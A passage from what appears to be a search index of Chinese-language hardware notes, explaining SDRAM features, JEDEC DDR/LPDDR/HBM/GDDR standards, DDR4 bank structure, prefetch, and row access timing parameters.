\u200b\u7684\u200b\u5f02\u5e38\u200b\u6062\u590d\u200b</li> <li>vxrm: rounding mode</li> <li>vxsat: saturation flag</li> <li>vcsr: vxrm + vxsat</li> </ul>"},{"location":"hardware/sdram.html","title":"SDRAM (Synchronous Dynamic Random Access Memory)","text":""},{"location":"hardware/sdram.html#_1","title":"\u7279\u70b9","text":"<p>SDRAM \u200b\u7684\u200b\u7279\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u6210\u672c\u200b\u8f83\u200b\u4f4e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b 1 bit cell \u200b\u53ea\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b CMOS \u200b\u6676\u4f53\u7ba1\u200b</li> <li>\u200b\u63a5\u53e3\u200b\u590d\u6742\u200b\uff0c\u200b\u8bbf\u95ee\u200b\u6570\u636e\u200b\u524d\u200b\u9700\u8981\u200b\u9996\u5148\u200b\u6fc0\u6d3b\u200b\u4e00\u4e2a\u200b row\uff0c\u200b\u518d\u200b\u8bfb\u53d6\u200b row \u200b\u5185\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u63a7\u5236\u5668\u200b\u4e5f\u200b\u6bd4\u8f83\u590d\u6742\u200b\uff0c\u200b\u9700\u8981\u200b\u5b9a\u671f\u200b\u5237\u65b0\u200b\u5185\u5b58\u200b</li> <li>\u200b\u5bb9\u91cf\u200b\u8f83\u5927\u200b\uff0c\u200b\u7531\u4e8e\u200b row \u200b\u548c\u200b column \u200b\u590d\u7528\u200b\u4e86\u200b\u5730\u5740\u200b\u7ebf\u200b\uff0c\u200b\u5355\u200b\u5185\u5b58\u6761\u200b\u53ef\u4ee5\u200b\u505a\u5230\u200b GB \u200b\u7ea7\u522b\u200b\u7684\u200b\u5bb9\u91cf\u200b</li> </ol>"},{"location":"hardware/sdram.html#_2","title":"\u6807\u51c6","text":"<p>SDRAM \u200b\u76f8\u5173\u200b\u6807\u51c6\u200b\u7531\u200b JEDEC \u200b\u5236\u5b9a\u200b\uff1a</p> <ul> <li>JESD79F: DDR SDRAM</li> <li>JESD79-2F: DDR2 SDRAM</li> <li>JESD79-3F: DDR3 SDRAM</li> <li>JESD79-4D: DDR4 SDRAM</li> <li>JESD79-5B: DDR5 SDRAM</li> </ul> <p>\u200b\u9664\u4e86\u200b DDR \u200b\u7cfb\u5217\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4f4e\u529f\u8017\u200b\u7684\u200b LPDDR \u200b\u7cfb\u5217\u200b\uff1a</p> <ul> <li>JESD209B: LPDDR SDRAM</li> <li>JESD209-2F: LPDDR2 SDRAM</li> <li>JESD209-3C: LPDDR3 SDRAM</li> <li>JESD209-4D: LPDDR4 SDRAM</li> <li>JESD209-5B: LPDDR5 SDRAM</li> </ul> <p>\u200b\u9ad8\u6027\u80fd\u200b\u5e38\u7528\u200b\u7684\u200b HBM \u200b\u4e5f\u200b\u57fa\u4e8e\u200b SDRAM \u200b\u6280\u672f\u200b\uff1a</p> <ul> <li>JESD235D: HBM</li> <li>JESD238A: HBM3</li> <li>JESD270-4: HBM4</li> </ul> <p>\u200b\u8fd8\u6709\u200b GDDR SGRAM \u200b\u7cfb\u5217\u200b\uff1a</p> <ul> <li>SDRAM3.11.5.8 R16.01: GDDR4 SGRAM</li> <li>JESD212C.01: GDDR5 SGRAM</li> <li>JESD232A.01: GDDR5X SGRAM</li> <li>JESD250D: GDDR6 SGRAM</li> </ul> <p>\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b DDR \u200b\u7cfb\u5217\u200b\u7684\u200b SDRAM\u3002</p>"},{"location":"hardware/sdram.html#_3","title":"\u6982\u5ff5","text":"<p>DDR SDRAM \u200b\u901a\u5e38\u200b\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6570\u5b57\u200b\u6765\u200b\u4ee3\u8868\u200b\u5b83\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u4f8b\u5982\u200b DDR4-2133 \u200b\u4e2d\u200b\u7684\u200b 2133\uff0c\u200b\u6709\u65f6\u5019\u200b\u4f1a\u200b\u89c1\u5230\u200b 2400 MT/s \u200b\u7684\u200b\u8bf4\u6cd5\u200b\u3002\u200b\u8fd9\u200b\u4e24\u8005\u200b\u8bf4\u200b\u7684\u200b\u90fd\u200b\u662f\u200b SDRAM \u200b\u6bcf\u79d2\u200b\u6700\u200b\u591a\u200b\u8fdb\u884c\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u6b21\u6570\u200b\uff0c\u200b\u5355\u4f4d\u200b\u662f\u200b Million Transfers per Second\u3002\u200b\u7531\u4e8e\u200b SDRAM \u200b\u91c7\u7528\u200b DDR \u200b\u8fdb\u884c\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u4f20\u8f93\u200b\u4e24\u4efd\u200b\u6570\u636e\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u200b\u7684\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u8981\u200b\u9664\u4ee5\u200b\u4e8c\u200b\uff0c\u200b\u4f8b\u5982\u200b 2133 MT/s \u200b\u5bf9\u5e94\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u5c31\u662f\u200b 1066 MHz\u3002</p> <p>\u200b\u6709\u65f6\u200b\u8fd8\u4f1a\u200b\u89c1\u5230\u200b PC4-21333 \u200b\u7684\u200b\u5199\u6cd5\u200b\u7528\u4e8e\u200b\u63cf\u8ff0\u200b\u5185\u5b58\u6761\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b \\(21333=8*2666\\)\uff0c\u200b\u5bf9\u5e94\u200b\u4e86\u200b 2666 MT/s\uff0c\u200b\u4e58\u4ee5\u200b 8 \u200b\u662f\u56e0\u4e3a\u200b DDR \u200b\u5185\u5b58\u6761\u200b\u7684\u200b\u6570\u636e\u4f4d\u200b\u5bbd\u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u4e2a\u200b 2666 MT/s \u200b\u7684\u200b\u5185\u5b58\u6761\u200b\u5176\u200b\u7406\u8bba\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u5c31\u662f\u200b \\(2666 \\mathrm{(MT/s)} * 64 \\mathrm{(bits)} / 8 \\mathrm{(bits/byte)} = 21333 \\mathrm{(MB/s)}\\)\u3002\u200b\u4f46\u200b\u4e5f\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b PC4 \u200b\u540e\u9762\u200b\u8ddf\u7740\u200b\u7684\u200b\u5c31\u662f\u200b MT/s\u3002</p> <p>\u200b\u4e0d\u540c\u200b\u4ee3\u6b21\u200b\u7684\u200b\u5185\u5b58\u6761\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5f15\u811a\u200b\u7684\u200b\u7f3a\u53e3\u200b\u4f4d\u7f6e\u200b\u4e0d\u540c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u662f\u200b\u65e0\u6cd5\u200b\u63d2\u9519\u200b\u5730\u65b9\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/sdram.html#_4","title":"\u7ed3\u6784","text":"<p>\u200b\u4ee5\u200b DDR4 SDRAM \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b MT40A1G8 \u200b\u82af\u7247\u200b\u7684\u200b\u7ed3\u6784\u56fe\u200b\uff1a</p> <p> </p> MT40A1G8 \u200b\u7684\u200b\u7ed3\u6784\u200b\u6846\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b Micron Datasheet\uff09 <p>\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u7684\u200b\u662f\u200b\u4e2d\u95f4\u200b\u7684\u200b Memory array\uff0c\u200b\u6bcf\u4e2a\u200b Memory array \u200b\u7684\u200b\u89c4\u683c\u200b\u662f\u200b 65536 x 128 x 64\uff0c\u200b\u79f0\u4e3a\u200b\u4e00\u4e2a\u200b Bank\uff1b\u200b\u56db\u4e2a\u200b Bank \u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b Bank Group\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b 4 \u200b\u4e2a\u200b Bank Group\uff0c\u200b\u6240\u4ee5\u200b\u603b\u200b\u5bb9\u91cf\u200b\u662f\u200b \\(65536 * 128 * 64 * 4 * 4 = 8 \\mathrm{Gb}\\)\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Memory array \u200b\u7684\u200b 65536 x 128 x 64 \u200b\u7684\u200b\u89c4\u683c\u200b\u91cc\u200b\uff0c65536 \u200b\u8868\u793a\u200b row \u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u6bcf\u4e2a\u200b row \u200b\u4fdd\u5b58\u200b\u4e86\u200b \\(128 * 64 = 8192\\) \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u662f\u200b\u56fe\u200b 1 \u200b\u4e2d\u200b <code>Sense amplifier</code> \u200b\u5230\u200b <code>I/O gating, DM mask logic</code> \u200b\u4e4b\u95f4\u200b\u4f20\u8f93\u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\u3002\u200b\u6bcf\u4e2a\u200b row \u200b\u6709\u200b 1024 \u200b\u4e2a\u200b column\uff0c\u200b\u6bcf\u4e2a\u200b column \u200b\u4fdd\u5b58\u200b\u4e86\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff08\u200b\u5bf9\u5e94\u200b <code>1 Gig x 8</code> \u200b\u4e2d\u200b\u7684\u200b 8\uff09\u3002\u200b\u7531\u4e8e\u200b DDR4 \u200b\u7684\u200b prefetch \u200b\u5bbd\u5ea6\u200b\u662f\u200b 8n\uff0c\u200b\u6240\u4ee5\u200b\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u4f1a\u200b\u53d6\u51fa\u200b 8 \u200b\u4e2a\u200b column \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 64 \u200b\u4f4d\u200b\u3002\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b row \u200b\u5c31\u662f\u200b 128 \u200b\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e0a\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b 65536 x 128 x 64 \u200b\u7684\u200b 128 x 64 \u200b\u7684\u200b\u6765\u6e90\u200b\u3002</p> <p>\u200b\u6bcf\u4e2a\u200b row \u200b\u6709\u200b 1024 \u200b\u4e2a\u200b column\uff0c\u200b\u6240\u4ee5\u200b column \u200b\u5730\u5740\u200b\u5c31\u200b\u6709\u200b 10 \u200b\u4f4d\u200b\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u56e0\u4e3a\u200b Burst Length \u200b\u662f\u200b 8\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u4e0a\u200b\u9ad8\u200b 7 \u200b\u4f4d\u200b\uff08\u200b\u5bf9\u5e94\u200b <code>128 x 64</code> \u200b\u7684\u200b 128\uff09\u200b\u4f1a\u200b\u9009\u62e9\u200b\u51fa\u200b 8 \u200b\u4e2a\u200b column\uff0c\u200b\u4f4e\u200b 3 \u200b\u4f4d\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u8fd9\u4e9b\u200b column \u200b\u7684\u200b\u4f20\u8f93\u200b\u987a\u5e8f\u200b\uff0c\u200b\u8fd9\u662f\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u200b\u7f13\u5b58\u200b refill \u200b\u7684\u200b\u4f18\u5316\u200b\uff0c\u200b\u628a\u200b\u8981\u200b\u8bfb\u53d6\u200b\u7684\u200b\u90e8\u5206\u200b\u5148\u200b\u53d6\u51fa\u200b\u6765\u200b\uff1a</p> <p> </p> DDR4 Burst \u200b\u7c7b\u578b\u200b\u548c\u200b Column \u200b\u6b21\u5e8f\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-4D DDR4\uff09"},{"location":"hardware/sdram.html#prefetch","title":"Prefetch","text":"<p>SDRAM \u200b\u6709\u200b Prefetch \u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u542b\u4e49\u200b\u5c31\u662f\u200b\u4e00\u6b21\u200b\u8bfb\u53d6\u200b\u4f1a\u200b\u53d6\u51fa\u200b\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u591a\u5c11\u500d\u200b\u7684\u200b\u6570\u636e\u200b\u51fa\u6765\u200b\u3002\u200b\u4f8b\u5982\u200b\u4e0a\u9762\u200b\u7684\u200b <code>1 Gig x 8</code> \u200b\u7684\u200b SDRAM\uff0c\u200b\u5176\u200b I/O \u200b\u6570\u636e\u4f4d\u200b\u5bbd\u200b\u662f\u200b 8 \u200b\u4f4d\u200b\uff08\u200b\u89c1\u200b\u53f3\u4fa7\u200b\u7684\u200b <code>DQ</code> \u200b\u4fe1\u53f7\u200b\uff09\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\u4ece\u200b <code>Global I/O Gating</code> \u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u5dee\u200b\u4e86\u200b\u4e00\u4e2a\u200b 8 \u200b\u7684\u200b\u56e0\u5b50\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b DDR4 \u200b\u7684\u200b 8n Prefetch\u3002\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\uff0cDDR4 SDRAM \u200b\u7684\u200b IO \u200b\u9891\u7387\u200b\u662f\u200b\u5f88\u200b\u9ad8\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b 3200 MT/s \u200b\u5bf9\u5e94\u200b\u7684\u200b I/O \u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u662f\u200b 1600 MHz\uff0c\u200b\u800c\u200b\u5b9e\u9645\u200b\u7684\u200b Memory array \u200b\u9891\u7387\u200b\u505a\u200b\u4e0d\u5230\u200b\u8fd9\u4e48\u200b\u9ad8\u200b\uff0c\u200b\u800c\u662f\u200b\u5de5\u4f5c\u200b\u5728\u200b 400 MHz\uff0c\u200b\u4e3a\u4e86\u200b\u5f25\u8865\u200b\u9891\u7387\u200b\u7684\u200b\u5dee\u8ddd\u200b\uff0c\u200b\u4e00\u6b21\u200b\u8bfb\u53d6\u200b 8 \u200b\u500d\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u4f53\u73b0\u200b\u5728\u200b I/O \u200b\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u5f97\u5230\u200b 8 \u200b\u4efd\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Burst Length \u200b\u4e3a\u200b 8\uff0c\u200b\u901a\u8fc7\u200b DDR \u200b\u65b9\u5f0f\u200b\u5728\u200b\u56db\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u5185\u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u6709\u8da3\u200b\u7684\u200b\u662f\u200b\uff0cDDR4 \u200b\u5185\u5b58\u6761\u200b\u4f4d\u200b\u5bbd\u200b\u662f\u200b 64\uff0c\u200b\u90a3\u4e48\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u5c31\u200b\u5f97\u5230\u200b \\(64 * 8 / 8 = 64B\\) \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6b63\u597d\u200b\u662f\u200b\u5f88\u591a\u200b CPU \u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002</p> <p>DDR5 \u200b\u628a\u200b Prefetch \u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 16n\uff0c\u200b\u8fd9\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u770b\u5230\u200b\u7684\u200b DDR5 \u200b\u7684\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u6570\u5b57\u200b\u5927\u200b\u4e86\u200b\u5f88\u591a\u200b\uff1a\u200b\u540c\u6837\u200b\u7684\u200b Memory array \u200b\u9891\u7387\u200b\u4e0b\u200b\uff0cDDR4 \u200b\u7684\u200b Prefetch \u200b\u662f\u200b 8n\uff0cDDR5 \u200b\u7684\u200b Prefetch \u200b\u662f\u200b 16n\uff0c\u200b\u4e8e\u662f\u200b I/O \u200b\u9891\u7387\u200b\u7ffb\u500d\u200b\uff0c\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u4e5f\u200b\u7ffb\u500d\u200b\u3002\u200b\u540c\u65f6\u200b\u4e3a\u4e86\u200b\u7ee7\u7eed\u200b\u4fdd\u6301\u200b\u4e00\u4e2a\u200b Burst \u200b\u662f\u200b 64 \u200b\u5b57\u8282\u200b\uff0cDDR5 \u200b\u5185\u5b58\u6761\u200b\u6bcf\u4e2a\u200b channel \u200b\u4f4d\u200b\u5bbd\u200b\u662f\u200b 32 \u200b\u4f4d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5185\u5b58\u6761\u200b\u63d0\u4f9b\u200b\u4e24\u4e2a\u200b channel\u3002</p>"},{"location":"hardware/sdram.html#_5","title":"\u8bbf\u95ee\u200b\u6a21\u5f0f","text":"<p>SDRAM \u200b\u7684\u200b\u8bbf\u95ee\u200b\u6a21\u5f0f\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b Memory array \u200b\u6bcf\u6b21\u200b\u53ea\u80fd\u200b\u4ee5\u200b\u6574\u4e2a\u200b row \u200b\u4e3a\u200b\u5355\u4f4d\u200b\u8fdb\u884c\u200b\u5b58\u53d6\u200b\u3002\u200b\u5728\u200b\u524d\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff08<code>1 Gig x 8</code>\uff09\u200b\u4e2d\u200b\uff0c\u200b\u4e00\u4e2a\u200b row \u200b\u6709\u200b 8192 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b\u64cd\u4f5c\u200b\u53ea\u200b\u6d89\u53ca\u200b 64 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u5148\u200b\u628a\u200b\u6570\u636e\u200b\u6240\u5728\u200b\u7684\u200b\u6574\u4e2a\u200b row \u200b\u53d6\u51fa\u200b\u6765\u200b</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u5728\u200b row \u200b\u91cc\u200b\u8bfb\u51fa\u200b\u60f3\u8981\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u4f46\u662f\u200b\u6bcf\u4e2a\u200b Bank \u200b\u540c\u65f6\u200b\u53ea\u80fd\u200b\u53d6\u51fa\u200b\u6765\u200b\u4e00\u4e2a\u200b row\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u4e24\u6b21\u200b\u8bfb\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b row\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u5148\u200b\u628a\u200b\u7b2c\u4e00\u6b21\u200b\u8bfb\u200b\u7684\u200b\u6570\u636e\u200b\u6240\u5728\u200b\u7684\u200b\u6574\u4e2a\u200b row \u200b\u53d6\u51fa\u200b\u6765\u200b</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0c\u200b\u5728\u200b row \u200b\u91cc\u200b\u8bfb\u51fa\u200b\u60f3\u8981\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u7b2c\u4e09\u6b65\u200b\uff0c\u200b\u628a\u200b\u7b2c\u4e00\u6b21\u200b\u8bfb\u200b\u7684\u200b row \u200b\u653e\u200b\u56de\u53bb\u200b</li> <li>\u200b\u7b2c\u56db\u6b65\u200b\uff0c\u200b\u628a\u200b\u7b2c\u4e8c\u6b21\u200b\u8bfb\u200b\u7684\u200b\u6570\u636e\u200b\u6240\u5728\u200b\u7684\u200b\u6574\u4e2a\u200b row \u200b\u53d6\u51fa\u200b\u6765\u200b</li> <li>\u200b\u7b2c\u4e94\u6b65\u200b\uff0c\u200b\u5728\u200b row \u200b\u91cc\u200b\u8bfb\u51fa\u200b\u60f3\u8981\u200b\u7684\u200b\u6570\u636e\u200b</li> </ol> <p>\u200b\u7528\u200b SDRAM \u200b\u7684\u200b\u672f\u8bed\u200b\u6765\u8bb2\u200b\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u56db\u6b65\u200b\u53eb\u505a\u200b Activate\uff0c\u200b\u7b2c\u4e8c\u90e8\u200b\u548c\u200b\u7b2c\u4e94\u6b65\u200b\u53eb\u505a\u200b Read\uff0c\u200b\u7b2c\u4e09\u6b65\u200b\u53eb\u505a\u200b Precharge\u3002</p> <p>SDRAM \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e0b\u5217\u200b\u7684\u200b\u65f6\u5e8f\u200b\u53c2\u6570\u200b\uff0c\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u5e8f\u200b\u8981\u6c42\u200b\uff1a</p> <ol> <li>CL\uff08CAS Latency\uff09\uff1a\u200b\u53d1\u9001\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5230\u200b\u8f93\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RCD\uff08ACT to internal read or write delay time\uff09\uff1a\u200b\u4ece\u200b Activate \u200b\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u6216\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RP\uff08RRE command period\uff09\uff1a\u200b\u53d1\u9001\u200b Precharge \u200b\u547d\u4ee4\u200b\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u547d\u4ee4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RAS\uff08ACT to PRE command period\uff09\uff1a\u200b\u4ece\u200b Activate \u200b\u5230\u200b Precharge \u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RC\uff08ACT to ACT or REF command period\uff09\uff1a\u200b\u4ece\u200b Activate \u200b\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b Activate \u200b\u6216\u8005\u200b Refresh \u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>RTP\uff08Internal READ Command to PRECHARGE command delay\uff09\uff1a\u200b\u4ece\u200b Read \u200b\u5230\u200b Precharge \u200b\u4e4b\u95f4\u200b\u7684\u200b\u65f6\u95f4\u200b</li> </ol> <p>\u200b\u4e8e\u662f\u200b\u4e0a\u9762\u200b\u7684\u200b\u6d41\u7a0b\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u95f4\u200b\u8981\u6c42\u200b\u5c31\u662f\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u6b65\u200b\uff0cActivate\uff0c\u200b\u53d6\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b row</li> <li>\u200b\u7b2c\u4e8c\u6b65\u200b\uff0cRead\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u4e8c\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RCD \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4ece\u200b Read \u200b\u53d1\u9001\u200b\u5730\u5740\u200b\u5230\u200b\u5f97\u5230\u200b\u6570\u636e\u200b\u8981\u200b\u7b49\u5f85\u200b CL \u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u7b2c\u4e09\u6b65\u200b\uff0cPrecharge\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u4e09\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RAS \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u7b2c\u4e8c\u6b65\u200b\u548c\u200b\u7b2c\u4e09\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RTP \u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u7b2c\u56db\u6b65\u200b\uff0cActivate\uff0c\u200b\u53d6\u51fa\u200b\u7b2c\u4e8c\u4e2a\u200b row\uff0c\u200b\u7b2c\u4e00\u6b65\u200b\u548c\u200b\u7b2c\u56db\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RC \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u7b2c\u4e09\u6b65\u200b\u548c\u200b\u7b2c\u56db\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RP \u200b\u7684\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u7b2c\u4e94\u6b65\u200b\uff0cRead\uff0c\u200b\u7b2c\u56db\u6b65\u200b\u548c\u200b\u7b2c\u4e94\u6b65\u200b\u4e4b\u95f4\u200b\u8981\u200b\u9694\u200b RCD \u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4ece\u200b Read \u200b\u53d1\u9001\u200b\u5730\u5740\u200b\u5230\u200b\u5f97\u5230\u200b\u6570\u636e\u200b\u8981\u200b\u7b49\u5f85\u200b CL \u200b\u7684\u200b\u65f6\u95f4\u200b</li> </ol> <p>\u200b\u6839\u636e\u200b\u8fd9\u4e2a\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7ed3\u8bba\u200b\uff1a</p> <ol> <li>\u200b\u8bbf\u95ee\u200b\u5e26\u6709\u200b\u5c40\u90e8\u6027\u200b\u7684\u200b\u6570\u636e\u200b\u6027\u80fd\u200b\u4f1a\u200b\u66f4\u597d\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u8fde\u7eed\u200b\u5730\u200b\u8fdb\u884c\u200b Read\uff0c\u200b\u51cf\u5c11\u200b Activate \u200b\u548c\u200b Precharge \u200b\u6b21\u6570\u200b</li> <li>\u200b\u4e0d\u65ad\u200b\u8bbf\u95ee\u200b\u4e0d\u540c\u200b\u7684\u200b row \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u9700\u8981\u200b\u6765\u56de\u200b\u5730\u200b Activate\uff0cRead\uff0cPrecharge \u200b\u5faa\u73af\u200b</li> <li>\u200b\u8bbf\u95ee\u200b row \u200b\u548c\u200b\u8bbf\u95ee\u200b row \u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u5206\u6210\u200b\u4e24\u4e2a\u200b\u9636\u6bb5\u200b\uff0c\u200b\u4e24\u4e2a\u200b\u9636\u6bb5\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5185\u5b58\u200b\u603b\u200b\u5bb9\u91cf\u200b\u5f88\u5927\u200b</li> <li>\u200b\u800c\u200b\u5982\u679c\u200b\u8bbf\u95ee\u200b\u603b\u662f\u200b\u547d\u4e2d\u200b\u540c\u4e00\u4e2a\u200b row\uff0c\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b Activate \u200b\u548c\u200b Prechage\uff0c\u200b\u53ef\u4ee5\u200b\u6301\u7eed\u200b Read\uff0c\u200b\u83b7\u5f97\u200b\u63a5\u8fd1\u200b\u7406\u8bba\u200b\u7684\u200b\u4f20\u8f93\u901f\u7387\u200b\uff0c\u200b\u5982\u56fe\u200b\uff1a</li> </ol> <p> </p> DDR3 \u200b\u540c\u4e00\u4e2a\u200b Row \u200b\u5185\u200b\u7684\u200b\u7684\u200b\u8fde\u7eed\u200b\u8bfb\u200b\uff08\u200b\u56fe\u6e90\u200b JESD9-3F DDR3\uff09 <p>\u200b\u4e3a\u4e86\u200b\u7f13\u89e3\u200b\u7b2c\u4e8c\u70b9\u200b\u5e26\u6765\u200b\u7684\u200b\u6027\u80fd\u200b\u635f\u5931\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b Bank \u200b\u7684\u200b\u6982\u5ff5\u200b\uff1a\u200b\u6bcf\u4e2a\u200b Bank \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u53d6\u51fa\u200b\u6765\u200b\u4e00\u4e2a\u200b 